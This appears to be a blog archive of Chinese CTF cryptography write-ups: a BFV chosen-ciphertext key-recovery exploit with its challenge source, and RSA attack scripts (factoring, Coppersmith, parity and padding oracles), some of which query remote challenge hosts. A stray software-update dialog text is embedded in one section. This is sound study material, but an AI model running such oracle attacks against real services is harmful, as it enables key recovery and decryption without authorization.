= 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample1(): return R([D() for _ in range(d)]) def sample2(): return R([randint(0, q - 1) for _ in range(d)]) def sample3(x): return [randint(0, T - 1) for _ in range(x)] def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk def encrypt(m): u = sample1() e1 = sample1() e2 = sample1() return (Roundq(pk[0] * u + e1 + delta * m), Roundq(pk[1] * u + e2)) def baseT(n, b=T): v = [] while True: x = n // b y = n % b v.append(y) if x == 0: break n = x v.reverse() return v def mutual(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) if tmp2[min(k, d)] == 0: print(True) else: print(False) signal.alarm(1024) sk, pk = keygen() print(f\u0026#34;public key:{pk[0].list()}, {pk[1].list()}\u0026#34;) namelist = [\u0026#34;admin\u0026#34;, \u0026#34;Adam\u0026#34;, \u0026#34;Bruce\u0026#34;, \u0026#34;Chris\u0026#34;, \u0026#34;David\u0026#34;] users = dict() for i in namelist: users[i] = getrandbits(32) menu = \u0026#39;\u0026#39;\u0026#39; 1.Add friends 2.find friends 3.Send Message 4.Regist\u0026#39;\u0026#39;\u0026#39; friends = set() while 1: print(f\u0026#34;Current number of users: {len(users)}\u0026#34;) print(menu) op = int(input(\u0026#34;\u0026gt;\u0026#34;).strip()) if op == 1: name = input(\u0026#34;name:\u0026#34;).strip() id_num = int(input(\u0026#34;id:\u0026#34;).strip()) if name in users.keys(): if id_num == users[name]: friends.add(name) else: print(\u0026#34;failed\u0026#34;) else: print(\u0026#34;failed\u0026#34;) elif op == 2: op2 = input(\u0026#34;recv ct?(Y/N)\u0026#34;).strip() if op2.upper() == \u0026#34;Y\u0026#34;: for name in users.keys(): id_num = users[name] x = baseT(id_num) y = x + sample3(d - len(x)) ct = encrypt(R(y)) print(ct[0].list(), ct[1].list()) op3 = input(\u0026#34;continue?(Y/N)\u0026#34;) if op3.upper() == \u0026#34;N\u0026#34;: break elif op3.upper() != \u0026#34;Y\u0026#34;: sys.exit(1) elif op2.upper() != \u0026#34;N\u0026#34;: sys.exit(1) for i in range(len(users)): c1 = input(\u0026#34;c1:\u0026#34;).strip().split(\u0026#34; \u0026#34;) c2 = input(\u0026#34;c2:\u0026#34;).strip().split(\u0026#34; \u0026#34;) cc1 = list(map(int, c1)) cc2 = list(map(int, c2)) mutual(i, [R(cc1), R(cc2)], sk) elif op == 3: name = input(\u0026#34;name:\u0026#34;).strip() message = input(\u0026#34;message:\u0026#34;).strip() if name not in friends: print(\u0026#34;failed\u0026#34;) else: if name == \u0026#34;admin\u0026#34;: if message == \u0026#34;give me the flag\u0026#34;: print(flag) else: print(f\u0026#34;send \u0026#39;{message}\u0026#39; to {name}\u0026#34;) elif op == 4: name = input(\u0026#34;name:\u0026#34;).strip() if name not in users.keys(): users[name] = getrandbits(32) print(\u0026#34;succeeded\u0026#34;) else: print(\u0026#34;failed\u0026#34;) else: sys.exit(1) 分析 # 需要我们泄露admin的id来添加一个friend来get massage\n这个题是一个经典的 CCA attack on FPSI\n针对全同态的一个攻击，但和常规情况不同的是在生成密钥时并未像标准加密系统中为了方便硬件运算使用0 1序列生成的多项式\n而是使用 [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] 得序列随机生成的私钥\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample_2(): return R([randint(0,1) for _ in range(d)]) def sample1(): return R([D() for _ in range(d)]) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk 原版payload只需要给$t_i=m$\n可以恢复出密钥\npayload:\nM=delta//4+50 Recoverd_key=[] for i in range(d): Recoverd_key.append(recover_key(i)) def recover_key(i): t1=[0 for _ in range(d)] t1[i]=M t2=M cc0=pk[0]+R(t1) cc1=pk[1]+R(t2) ans = decrypt([cc0,cc1]).list() return ans[i] 但题目情况密钥并不为0 1 序列而且Oracle attack只能判断为该位上数字是否为0\n在改变t1[i]=M M的个数后发现以下性质：\n私钥\\ 返回的数据 M 2M 7M 5M 7 2 2 3 0 6 2 2 3 0 5 2 2 3 0 4 1 2 3 0 3 1 1 3 -1 2 1 1 2 -1 1 1 1 2 -1 0 0 1 2 -1 -1 0 0 2 -2 -2 0 0 1 -2 -3 -1 0 1 -2 -4 -1 -1 1 -2 -5 -1 -1 1 -3 -6 -1 -1 0 -3 -7 -1 -1 0 -3 只要按顺序 n = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] t1 = n*M 就可以对密钥进行一个padding Oracle\nexp # from pwn import * # from icecream import * from tqdm import tqdm from time import * p1 = time() # ----------------------------------- # get pk # io = remote(\u0026#39;0.0.0.0\u0026#39;,10001) io = remote(\u0026#39;172.20.5.23\u0026#39;,8001) q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma = 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def mutual2(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) return tmp2 io.recvuntil(\u0026#39;public key:[\u0026#39;) pk1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] io.recvuntil(\u0026#39;[\u0026#39;) pk2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] # print(pk1) # print(pk2[:100]) pk2 = [int(i) for i in pk2.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) pk1 = [int(i) for i in pk1.split(b\u0026#39;,\u0026#39;)] pk=[R(pk1),R(pk2)] for i in range(1024-5): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;4\u0026#39;) io.sendline(str(i)) M=delta//4+50 padding = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] sks= [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] rk=[100 for i in range(1024)] for x in range(len(sks)): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) print(io.recvuntil(\u0026#39;recv ct?(Y/N)\u0026#39;)) io.sendline(\u0026#39;Y\u0026#39;) sleep(1) print(io.recvuntil(\u0026#39;[\u0026#39;)) adminC1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] print((io.recvuntil(\u0026#39;[\u0026#39;))) adminC2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] adminC1 = [int(i) for i in adminC1.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) adminC2 = [int(i) for i in adminC2.split(b\u0026#39;,\u0026#39;)] print(io.recvuntil(\u0026#39;continue?(Y/N)\u0026#39;)) io.sendline(\u0026#39;N\u0026#39;) pad = padding[x] print(f\u0026#39;第{x}个了\u0026#39;) for k in tqdm(range(1024)): t1=[0 for _ in range(d)] t1[k]=pad*M t2=M # ================================ cc0=(pk[0]+R(t1)).list() payload_c1 = \u0026#39;\u0026#39; for i in cc0: payload_c1 += str(i) payload_c1+=\u0026#39; \u0026#39; payload_c2 = \u0026#39;\u0026#39; cc1=(pk[1]+R(t2)).list() for i in cc1: payload_c2 += str(i) payload_c2+=\u0026#39; \u0026#39; io.recvuntil(\u0026#39;c1:\u0026#39;) io.sendline(payload_c1) # sleep(1) io.recvuntil(\u0026#39;c2:\u0026#39;) io.sendline(payload_c2) # ===================================== fb = io.recvline() if(b\u0026#39;True\u0026#39; in fb and rk[k]==100): rk[k] = sks[x] # input() for i in range(len(rk)): if(rk[i]==100): rk[i]=7 sk = R(rk) adminCT=[R(adminC1),R(adminC2)] # cc0=R(ct[0].list()) # cc1=R(ct[1].list()) ans = mutual2(0,adminCT,sk) x = ans.list()[:25] admin_id =0 use=[] ids=[] for i in x: admin_id *= T admin_id += i use.append(i) ids.append(admin_id) print(rk) print(ids) # io.interactive() sleep(1) for id in ids: print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;name:\u0026#39;)) io.sendline(\u0026#39;admin\u0026#39;) print(io.recvuntil(\u0026#39;id:\u0026#39;)) io.sendline(str(id)) print(io.recvline()) print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;3\u0026#39;) io.sendlineafter(\u0026#39;name:\u0026#39;,\u0026#39;admin\u0026#39;) io.sendlineafter(\u0026#39;message:\u0026#39;,\u0026#39;give me the flag\u0026#39;) sleep(1) print(io.recv(2048)) p2 = time() print(p2-p1) FLAG\nb\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;flag{CCA_attack_BFV_123698745}\\n\u0026#39; [*] Closed connection to 172.20.5.23 port 8001 /mnt/c/U/1/De/qwb决赛/bfv 有个小地方每处理好，不知道为什么sk = 7不能完全正确的Oracle，只能手动恢复了\n服务器OI速度及其慢 等了半天才打通\n","date":"11 July 2021","permalink":"/achieve/ctf/qwbs5wp/","section":"archive","summary":"","title":"Writeup for BFV in 强网杯S5 final"},{"content":"\rgkctf2021 6-25 # 太菜了,只做了两个题,时间还不够了呜呜\npythonrandom 通杀脚本 # from randcrack import RandCrack rc = RandCrack() for i in data: r = bin(int(i))[2:].zfill(64) r1 = r[:32] r2 = r[32:] rc.submit(int(r2, 2)) rc.submit(int(r1, 2)) tmp = rc.predict_getrandbits(64) rrrrsa # 小数论题\n注意mod n和mod q之间的关系\nfrom libnum import * from Crypto.Util.number import * from icecream import * e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829 c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569 cc1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951 cc2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270 # hint1 = pow(2020 * p1 + q1, 202020, n1) # hint2 = pow(2021 * p1 + 212121, q1, n1) a = 2020 e1 = 202020 e2 = 212121 tmp = ((cc2-e2)*a*invmod(a+1,n1))%n1 tmp = pow(tmp,e1,n1)-cc1%n1 q1 = gcd(tmp,n1) p1 = n1//q1 ic(q1,n1%q1) phi1 = (p1-1)*(q1-1) d1 = invmod(e,phi1) P = pow(c1,d1,n1) a = 2020 e1 = 202020 e2 = 212121 t = e1*e2 n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489 c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004 cc1=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077 cc2=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513 f1 = cc2 *pow(a,e2,n2)*invmod(pow(a+1,e2,n2),n2)%n2 tmp = (pow(f1,e1,n2)-pow(cc1,e2,n2))%n2 q2 = gcd(tmp,n2) ic(q2,n2%q2) p2 = n2//q2 phi2 = (p2-1)*(q2-1) d2 = invmod(e,phi2) Q = pow(c2,d2,n2) e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 p=P q=Q n=p*q phi = (p-1)*(q-1) d = invmod(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8} ","date":"10 July 2021","permalink":"/achieve/ctf/dozer2021/","section":"archive","summary":"gkctf2021 6-25 # 太菜了,只做了两个题,时间还不够了呜呜","title":"Writeup for DozerCtf 2021"},{"content":" 一些RSA垃圾题\nnormal # rsa1 p-q # p q相差太小,直接用费马方法分解\nfrom Crypto.Util.number import * from gmpy2 import next_prime import random ## p = getPrime(512) ## q = next_prime(next_prime(p) + random.randint(2 ** 10, 2 ** 15)) ## q = p+a ## 费马方法分解n def fermat_factors(n): assert n % 2 != 0 import gmpy2 a = gmpy2.isqrt(n) b2 = gmpy2.square(a) - n while not gmpy2.is_square(b2): a += 1 b2 = gmpy2.square(a) - n factor1 = a + gmpy2.isqrt(b2) factor2 = a - gmpy2.isqrt(b2) return int(factor1), int(factor2) n = 58469790767119395443619182703965753536155769938155967209185013051235434307443199577853487462032941284716788878629026151008480533108948515487216969655522610052504252431114883354036178747396340974017983797943561003427523330887483816814526450542542017962396566419907954878575664402091503063651747784708370988551 e = 65537 c = 5210792629811531618748922441951091043558836768927486327066208193531783313814007532484357434613606536101786384803692759877417618085066111343186477103523861319942108843549903015256729449831006717779587476869110804323636543879652560144414279029912184440958215613248124698646241943161894215574508920550451749893 q, p = fermat_factors(n) d = inverse(e, (p - 1) * (q - 1)) print(long_to_bytes(pow(c, d, n))) flag b\u0026rsquo;flag{this_is_flag}'\nrsa4 ed2n # 用以下脚本来求qp\ndef getpq(n,e,d): while True: k = e * d - 1 g = random.randint(0, n) while k%2==0: k=k//2 temp=gmpy2.powmod(g,k,n)-1 if gmpy2.gcd(temp,n)\u0026gt;1 and temp!=0: return gmpy2.gcd(temp,n) rsa 5 EeE # 小公钥加密，尝试队c直接开三次方\nc=74802199268289650659966949121722134398741724016029787984879330914681382911392412708797079066742193788624174545434065877798917466086322130161380099507267024211772226618358174709389234588799169125 import gmpy2 m = gmpy2.iroot(c,3) print(m) rsa7 Radin # 使用python脚本 代码：\nfrom Crypto.PublicKey import RSA rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(,n,e) 带私钥版本：\nrsakey = RSA.importKey(open(\u0026#34;prikey.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e d = rsakey.d q = rsakey.q p = rsakey.p print(e,d,n,p,q) Rabin算法的解密原理是：假设我们知道m%p 和 m%q，那么拿着中国剩余定理立刻可以知道 m%n的值。又有m\u0026lt;n，则m的值就直接拿到了，岂不美哉？\n实际上标准的Rabin算法的解密会得到四个结果。我们一一对比就可以找到flag\n专门用于解radin的脚本：\nfrom Crypto.Util.number import * def squareMod(c, mod): ## 模意义下开根，找到 x, 使得 x^2 % mod = c assert(mod % 4 == 3) res = gmpy2.powmod(c, (mod+1)//4, mod) return res, mod - res def getPlaintext(x, y, p, q): ## 假设 m%p=x, m%q=y, 求明文 res = x*q*gmpy2.invert(q, p) + y*p*gmpy2.invert(p, q) return res % (p*q) def solve(c, p, q): ## 已知 p,q, 解密 c px = squareMod(c, p) py = squareMod(c, q) for x in px: for y in py: yield getPlaintext(x, y, p, q) c = open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() ## print(c) c = int(c.hex() ,16) p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 for msg in solve(c, p, q): print(long_to_bytes(msg)) RSA oracle # rsa10 nctf2020 # from Crypto.Util.number import getPrime, inverse, GCD, bytes_to_long # from secret import flag flag = b\u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39; m = bytes_to_long(flag) while True: p = getPrime(512) q = getPrime(512) n = p * q e = getPrime(32) if GCD((p-1)*(q-1), e) == 1: d = inverse(e, (p-1)*(q-1)) break print(e, n, pow(m, e, n), sep=\u0026#39;\\n\u0026#39;) for _ in range(10000): cc = int(input(\u0026#34;\u0026gt; \u0026#34;)) mm = int.to_bytes(pow(cc, d, n), 1024//8, \u0026#39;big\u0026#39;) print(mm.startswith(b\u0026#34;\\x00\u0026#34;)) 先确定flag长度，用二分法无限逼近flag的值\nfrom pwn import * from Crypto.Util.number import * r = remote(\u0026#34;0.0.0.0\u0026#34;,10001) buf = r.recvline() e = int(buf.decode().strip()) n = int(r.recvline().decode().strip()) c = int(r.recvline().decode().strip()) max = 2**826 min = 2**822 while (max-min\u0026gt;1): mid = (max+min)//2 temp = (pow(mid,e,n)*c)%n r.sendline(str(temp)) data = r.recvline() print(data) ## data = r.recvline() if(b\u0026#39;True\u0026#39; in data): min = mid else: max = mid print(min,max) print(long_to_bytes(2**1016//min)) print(long_to_bytes(2**1016//max)) rsa 格规约攻击 # rsa 12 fac with hit # 利用coppersmith获取p\nn = 0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7d p_fake = 0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000 pbits = p_fake.nbits() ##kbits = 900 kbits = 128 ##p失去的低位 pbar = p_fake \u0026amp; (2^pbits-2^kbits) print \u0026#34;upper %d bits (of %d bits) is given\u0026#34; % (pbits-kbits, pbits) PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] ## find root \u0026lt; 2^kbits with factor \u0026gt;= n^0.3 p= x0 + pbar print p rsa13 bigger d # rsa14Partial Key # rsa 15 Wiener plas # rsa17 Linear math # 一次论文攻击方式复现\n[Window Title] Update Available [Main Instruction] A new version of Sublime Text is available, download now? [Download] [取消] from libnum.common import gcd from data import b,c from gmpy2 import * from Crypto.Util.number import * import time import libnum n = 110384114201475663616747380525627123445579689285630886040168434260829091685143698389730908307058264757595472490646553684116819186297946861038089011634839837455006286876809812362253126020273844190061817352704628672775002140119322152762726493845024580159588306209024297015077439731424454595795781027348887941827 a = 877 t = 541 e = 0x101 strat = time.time() Pk = [] for k in range(e): tot = 1 ## print(k) for k1 in range(e): if k!= k1 : ## print(gcd((b[k]-b[k1])%n,n)) tot *= libnum.invmod((b[k]-b[k1])%n,n) tot %= n tot %= n Pk.append(tot) v=0 for k in range(e): v += (pow(b[k],e,n)*Pk[k])%n v %= n tmp = 0 for k in range(e): tmp += (c[k]*Pk[k])%n tmp %=n x = ((libnum.invmod(e,n)*(tmp-v))%n)%n from Crypto.Util.number import * print(x*libnum.invmod(a,n)%n) end = time.time() print(end - strat) rsa21 half p # 题目给出了dp和一对公钥\n已知\n$dp+k*(p-1)=d;mod;p-1$\n$ed=1=k*(p-1)(q-1)+1;mod;(p-1)(q-1)$\n$ed=e*dp;mod;p-1$\n$k_1*(p-1)(q-1)+1=k_2(p-1)+dpe$\n可写为\n$(p-1)=(dp*e-1)/x$\n由式子可知x小于e，若e较小，对e遍历就可以得到p q\nimport gmpy2 from Crypto.Util.number import bytes_to_long, long_to_bytes n = 82459095549748227929288050555498384469575272567666482697551651645093561076800636903414213079689167610546931321044499258842967876311854597995877424799325872420793993678223520863171113084551896184041824490162048421763392587578106892564418656377436734864113039255928135310184434095934015134373147964955532123881 dp = 2154496166987404807570061246274794378102105725450715702694091896971248930139905533434215910296644935717134018627774991211321921063947893592214392985692261 e = 65537 c = 31011021137992452431076840432639365407713019786586660934070807380893254876293446768579394082019427413952266893686196624551302747440454439484165217862543849146153312457417254751109386482402322429697563463538223851046832003654970628089968896006236813877570702218773093761582493452679741468626986210359922340714 for i in range(1, e): if (e * dp - 1) % i == 0: p = (e * dp - 1) // i + 1 if n % p == 0: q = n // p phin = (p - 1) * (q - 1) d = gmpy2.invert(e, phin) print(long_to_bytes(pow(c, d, n))) break rsa26 partial message # 构造多项式$f=（m+x）^3-c=0;mod;n$\ndef phase2(high_m, n, c): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) m = high_m + x M = (m^3 - c).small_roots()[0] print(M) n = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 high_m = 0x464c41477b325e38727361373538393639336663363839633737633566353236326436000000000000000000 from Crypto.Util.number import * print(long_to_bytes(2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736+phase2(high_m, n, c))) FLAG{2^8rsa7589693fc689c77c5f5262d654272427}\nrsa27 partial d and n c # from Crypto.Util.number import * def getFullP(low_p, n): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) p = x*2^512 + low_p root = (p-n).monic().small_roots(X = 2^128, beta = 0.4) if root: return p(root[0]) return None def phase4(low_d, n, c): maybe_p = [] for k in range(1, 4): p = var(\u0026#39;p\u0026#39;) p0 = solve_mod([3*p*low_d == p + k*(n*p - p^2 - n + p)], 2^512) maybe_p += [int(x[0]) for x in p0] print(maybe_p) for x in maybe_p: P = getFullP(x, n) if P: break P = int(P) Q = n // P assert P*Q == n d = inverse_mod(3, (P-1)*(Q-1)) ## print(hex()[2:]) print(long_to_bytes(power_mod(c, d, n))) n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 phase4(low_d, n, c) ## FLAG{2^8rsa5ab086745f6ec745619a8b65fe4ec560} rsa 28 bit Oracle # e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 from pwn import * left=0 right=n num=0 import gmpy2 while right-left\u0026gt;2: num+=1 tmp=gmpy2.powmod(2,num*e,n) senddata=hex((c*tmp)%n)[2:] ## 111.200.241.244:62839 io=remote(\u0026#39;111.200.241.244\u0026#39;,62839) io.recv() io.sendline(senddata) ans=io.recvline().decode()[:-1] print(ans) if ans==\u0026#39;odd\u0026#39;: left=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 else: right=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 print(right-left) print(num) io.close() print((left,right)) import gmpy2 while gmpy2.powmod(left,e,n)!=c: left-=1 print(left) from Crypto.Util import number print(number.long_to_bytes(left)) ","date":"14 June 2021","permalink":"/achieve/2019to2021/rsaallinone/","section":"archive","summary":"一些RSA垃圾题","title":"RsaAllInOne"},{"content":"\r蓝🐱ber 2021半决赛 # 很气 , 为什么这傻逼玩意3点结束\n中文12点钟还在上机做实验 😅😅😅\n笑死 吃个饭根本没有时间写脚本\nvery smooth # ​\t白给题\n连上后有一个 Hints 是一个特殊素数的题\n可以对任意明文用 E，N 加密,上传4,8,16,0x20利用选择明文的方式得到 n\n把n分解掉得到pq\nfrom gmpy2 import gcd from Crypto.Util.number import inverse, long_to_bytes, sieve_base as primes c2 = 0x42a03c9a532106552a1517f833746c75951b9daebc0fd66b616f54622b44f3aec6227a3b4f02f4e77ae98209fa4c52c43596a44468a336d956d69be9588e6544c98313c9e8b4083cc3165102c7704834c66e165971419e17717f98eb0e494c71c498e7c7432a4753329912ec2a60a128e04c93e28c5c253e6ee17c3376f0712fb3b7ae72715f76366eeeb207a5367db8e2f43a5ad33459014bef0d3c225bd11768124a75a54e7c910151cd314ae7bbc4f86fbf6a5f2df7cda7467596bb415d2165ab282c38b2dccd736c3c5f2fea9cf64f417b6340f7d59069f739aa538b6e074fd149a016fc446439a8c2b59d306f748e9abd21a15947f3b31d9cac9c932e9c4d9e639247eaa2345651bf8d741943904c33316b5ebff740f609605ccb0d0069a0e45d230a6af1d12904d998d540387f89529cf8a5c6b491c7bd190ce98120adeab6c6400a735369234655d20dbd1f86213da6bd2ffc07f8c4debc39b33954dc38ac1d897bd58f585f892d35fa9367478f44bc25ac809d3a336aa0a9af3bc7f2661c06cbd414b1a99e1058593a7415135464a10fd0cffa2a5d50bbff9478825075371833996f5f780389b7e466a9545cfbb76fb4cff56addab40c4c043295752a4dbf085cd57e32a44d88c36bd8c71ab55f835a0f54d47db7b1cd9b38dffe4cb2076c7fa38d47ad791e97220c75d795009f933de26d18f19439cb89b1c6eee9b921155 c4 = 0x4e0fc3b860cc8b893eb63d23cfb68ac9750e0519e54949f45e5c230d53443758a7f5187fa111399edad5b82d01546cafc756738c4ba8c80f7f5ccd3f0401ce0d494ee6988fbf9995434a35e70ad5271d18f0790dfb7593022927116a0c2dcdea61e25eeabc67da1b22bc0c2f44be8d35da70af6f78696302d5e78e838668eb22240bc8916c2ed9b90c48ba9bc2d610e9019efba6c8a1f63ed204fbed82954582671b7ca8be91411c0ef4dbc918d913ed80a234ca448b298366fcb6dc241ed3d7744cb3bf5d24811a34875a346bfb37e35f3a77cc5f96aa65863ff7aac97142b2d1eb2b73a72a7918b87d99cfd5f3e7adac18c5016e4e41c96d0110570f7a937b3a21d7e94ea0b407b58d87893903b10e6a3088e3a07426e8d41dd197af71ac855e9a6a6e060556b853e2b40aad8d2581732163ca76c938e687f37c30ac48b3dda19e8814c10f852e71421cae9bdd795e0c7a9afb34261900236c586e59469f0cecd9cdfc81ebeeb0bc6e2f19f6dfb949ee00bd4ed8a1a553dc4a145ae415e39aec7f56ad2c5ef1a33f943b126bc8b67fbb632b01eda6e06ce0f847e32218dcfa5f70687e55e8d7d844308d61311077c5cd4b022c42d6bbf0b436542093bf60cd0ce87b7c9bcb3517ae